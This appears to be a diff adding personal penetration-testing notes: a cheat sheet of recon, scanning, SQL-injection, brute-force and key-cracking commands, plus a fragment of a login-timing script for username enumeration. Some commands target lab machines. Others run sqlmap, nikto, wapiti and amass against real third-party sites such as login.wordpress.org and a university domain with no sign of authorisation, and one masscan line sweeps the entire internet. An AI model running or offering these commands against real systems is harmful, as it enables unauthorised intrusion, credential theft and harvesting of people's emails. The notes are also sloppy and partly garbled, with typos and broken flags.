@@ -1,0 +1,184 @@
+##Master one attack and look for it on all 
+#Use proxy to prevent ip from being blocked when bug bounty
+#Use proxy to acess site as if you were in another country
+#Find out who worked on the page who are the admins is there content on the page that might reveal who the owner is ?
+#regularly explore the webpage even if you think its not important
+#REVIEW THIS AND YOUR NOTES EVERY HOUR
+
+#LOGIN pages 
+#look at time to login
+
+#CUSTOM TOOLS
+##CURL
+### Send Custom Request: look at the request in the network tab of inspect and copy the request type and body
+### curl -X POST [options] [URL]
+### -X option specifies the request method
+##PYTHON
+###import requests
+###
+###def doLogin(username):
+###   creds = {"username":username,"password":"invalidPassword!"}
+###   response = r.post(URL,json=creds)
+###for i in wordlist:
+###startTime = time.time()
+###doLogin(user)
+###endTime = time.time()
+
+
+
+Some things to keep an eye out for:
+	custom .js on a login page
+
+
+searchsploit:
+	searchsploit --nmap nmap_initial.xml
+
+dimtry: gives ip like a whois
+	dmitry -o dmitryscan list.wordpress.org
+
+dnsdumpster.com
+
+amass: gives subdomains by looking on other search engines and webpages
+	amass enum -v -src -ip -brute -min-for-recursive 2 -d 205.71.71.119
+	amass enum -d clearpass.limestone.edu -ip 
+	
+masscan:
+	masscon 0.0.0.0/0 --ports 0-65535 --rate 30000000000 --exclude 255.255.255.255 >>masscan.txt
+	masscan 172.16.8.3 --ports 0-65535 --rate 30000 --exclude 255.255.255>>massan.txt
+
+gobuster: brute force directory enumeration
+	gobuster dir -u http://10.10.86.235 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.txt
+
+dirb: (directory buster terminal version) looks for directory extensions
+	dirb https://wordpress.org -o dirbscan.txt
+
+dirbuster
+	put in ip http://ip:80/
+
+nikto: *not stealthy* scans webservers for possible vulns gives ip and port "you can change it" tells you root page redirect
+	nikto -h wordpress.org -o nikto_scan.txt
+	nikto -h 10.10.81.155 -p 3333 -o niktoscan.txt
+nmap
+	nmap -Pn -s
+	nmap -sS -T2 172.16.8.3
+ZAP: similar to burp but way more automation run ZAP GUI
+	
+wapiti: get possible exploits on webpage
+	wapiti -u https://clearpass.limestone.edu/tips/tipsLogin.action -o pathtosave
+	wapiti -u http://10.10.86.235/ -o wapitiscan
+
+Grabber: similar to wapiti
+
+Recon-ng
+
+
+
+jSQL injection:
+	jsql
+	paste http://blogs.bulls.com/
+	click admin page
+
+
+SQLmap:
+	sqlmap -u https://login.wordpress.org -time-sec 10 (looksfor sql injection)
+	sqlmap -u https://login.wordpress.org -dbs
+	sqlmap -u http://blogs.bulls.com/ -time-sec 20
+	sqlmap -u http://blogs.bulls.com/ -time-sec 20 --froms --crawl=2
+
+
+
+
+httrack: tracks all the content in the webpage maybe injectable USED TO COPY WEBPAGE
+	httrack http://blogs.bull.com
+
+joomscan: for joomla cms
+	joomscan -u wordpress.org
+
+wig (Webapp Information gatherer) 
+skipfish
+dnsenum
+certstream
+
+Extract potential emails:
+	sudo python3 /media/sf_SharedFolder/Recon/EmailSpider.py
+	wget -q -r -l 5 -O - http://somesite.com/ | grep -E -o "\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\b"
+	wget -q -r -l 5 -O - http://10.10.6.135/ | grep -E -o "\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\b"
+
+
+metagoofil: extract files from webpages
+	metagoofil -d wordpress.org -t pdf,doc,xls,ppt,ods,docx,xlsx,pptx,txt,sql -l 500 -n 100000 -o wordpressfiles -f wordpressresults2.html
+
+
+
+
+	
+
+davtest: see if you can write to the server
+cadaver:upload to server
+
+
+
+
+urlcrazy:looks for possible typos in url name 
+nbtscan: old ntbs systems maybe vulns
+
+
+
+AFTER SCANS
+what did i find?
+any inputs?
+any file uploads?
+	what extensions are blocked?
+		upload a file with code in it and go to that page to view your uploaded file.
+
+
+Gathered Email or account names usernames
+
+haveibeenpwn.com:
+	click on passwords
+	download biggest file of each format
+	
+
+Exploits
+xhydra:(GUI hydra) 59.36 https://www.youtube.com/watch?v=HRlVRH_BAh4&has_verified=1
+	singleTarge put in ip
+	port 80 or 443
+	protocol http-get
+	passowrd select usermane admin slecet generate
+	start start
+
+Hydra:
+	hydra 192.168.56.101 -l admin -P /usr/share/set/src/fasttrack/wordlist.txt http-get-form "/dvwa/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=medium;PHPSESSID=382864dac22c2c85bb4f5e3c3421d12e"
+	sudo hydra ssh://10.10.203.26 -l jan -P /usr/share/wordlists/rockyou.txt
+	sudo hydra ftp://10.10.193.39 -l chris -P /usr/share/wordlists/rockyou.txt
+
+
+jSQL injection:
+	paste http://blogs.bulls.com/
+	click admin page
+
+
+SQLmap:
+	sqlmap -u https://login.wordpress.org -time-sec 10 (looksfor sql injection)
+	sqlmap -u https://login.wordpress.org -dbs
+	sqlmap -u http://blogs.bulls.com/ -time-sec 20
+	sqlmap -u http://blogs.bulls.com/ -time-sec 20 --froms --crawl=2
+
+
+SSH
+What to do with RSA keys:
+	found one 
+	save it 
+		nano knobi_rsa
+	change permissions:
+		chmod 600 knobi_rsa
+	use it:
+		ssh -i knobi_rsa kenobi@10.10.2.3
+	if passowrd protected:
+		python3 /usr/share/john/ssh2john.py knobi_id_rsa > idcrack
+		sudo john idcrack --wordlist=/usr/share/wordlists/rockyou.txt
+	use it:
+		ssh -i knobi_rsa kenobi@10.10.2.3
+
+
+
